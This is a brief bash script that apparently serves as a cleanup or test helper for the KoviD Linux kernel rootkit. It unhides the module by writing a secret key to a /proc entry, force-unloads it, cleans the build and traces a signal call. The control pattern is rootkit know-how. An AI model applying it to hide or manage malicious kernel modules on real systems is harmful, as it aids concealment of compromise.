#!/bin/bash
echo "unhide-lkm=${UNHIDEKEY}" > /proc/${PROCNAME}
rmmod -f kovid
make clean
strace kill -CONT 501 2>&1 | grep "kill(501, SIGCONT)" | awk '{ print $4 }'